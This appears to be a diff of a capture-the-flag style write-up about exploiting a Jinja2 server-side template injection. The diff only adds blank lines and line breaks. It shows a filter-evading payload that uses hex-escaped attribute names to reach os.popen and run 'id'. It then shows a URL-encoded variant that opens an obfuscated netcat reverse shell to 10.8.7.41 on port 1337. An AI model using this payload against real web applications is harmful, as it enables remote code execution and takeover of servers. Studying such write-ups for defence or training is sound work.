@@ -39,7 +39,9 @@ So now we found an exploit command which will find the os library within the run
 
 
 ```py
+
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
 ```
 
 This worked and we got our output.
@@ -54,7 +56,8 @@ Now the exploit looks as follows
 
 ```py
 /%7B%7Brequest|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen'
-('rm\x20\x2Ftmp\x2Ff\x3Bmkfifo\x20\x2Ftmp\x2Ff\x3Bcat\x20\x2Ftmp\x2Ff\x7Cbash\x20\x2Di\x202\x3E\x261\x7Cnc\x2010\x2E8\x2E7\x2E41\x201337\x20\x3E\x2Ftmp\x2Ff')|attr('read')()%7D%7D
+('rm\x20\x2Ftmp\x2Ff\x3Bmkfifo\x20\x2Ftmp\x2Ff\x3Bcat\x20\x2Ftmp\x2Ff\x7Cbash\x20\x2Di\x202\x3E\x261\x7Cnc
+\x2010\x2E8\x2E7\x2E41\x201337\x20\x3E\x2Ftmp\x2Ff')|attr('read')()%7D%7D
 
 ```
 
